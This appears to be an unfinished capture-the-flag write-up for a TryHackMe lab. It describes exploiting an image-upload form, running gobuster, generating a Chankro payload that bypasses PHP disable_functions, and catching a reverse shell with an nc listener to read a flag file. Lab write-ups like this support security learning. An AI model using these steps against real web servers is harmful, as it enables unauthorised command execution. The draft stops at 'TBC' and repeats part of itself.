```                                                                                            
 _____                        ____  _         _   _        _____             _   _             
| __  |_ _ ___ ___ ___ ___   |    \|_|___ ___| |_| |___   |   __|_ _ ___ ___| |_|_|___ ___ ___ 
| __ -| | | . | .'|_ -|_ -|  |  |  | |_ -| .'| . | | -_|  |   __| | |   |  _|  _| | . |   |_ -|
|_____|_  |  _|__,|___|___|  |____/|_|___|__,|___|_|___|  |__|  |___|_|_|___|_| |_|___|_|_|___|
      |___|_|
```
Practice bypassing disabled dangerous features that run operating system commands or 
start processes. [^1]

Compromise the machine and locate the `flag.txt`.
-----------------------------------------------------------------------------------------
The target website offers a job listing with an *Apply Job* interface, where applicants
can upload their CV as an image. Since we already suspect a file upload vulnerability to
be worth investigating, we upload a random picture and inspect the network traffic. This
way, we are not able to find out the output directory location of the uploaded file
however, and use `gobuster` for that, e.g.
`gobuster dir -u http://<TARGET_IP_ADDRESS> -w /usr/share/wordlists/dirb/common.txt`.
With it, we are able to spot the `/uploads/` directory with our sample test image and
the valuable `phpinfo.php` *PHP Version* page of the webserver configuration. On it, we
can already spot the *Context Document Root* directory that we'll later need for our
payload generation to be `/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db`.


`git clone https://github.com/TarlogicSecurity/Chankro.git`

```
python2 chankro.py --arch 64 --input in.sh --output out.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
```

`nc -lnvp <PORT>`


`cat /home/s4vi/flag.txt`




When browsing to the webpage http://<IP_ADDRESS> it is noticeable that an image
file for the CV can be uploaded in the "Apply Jobs" section.
After downloading a random image "payload.png" TBC


[^1]: https://tryhackme.com/room/bypassdisablefunctions
[^2]: https://www.revshells.com/
[^3]: https://en.wikipedia.org/wiki/List_of_file_signatures
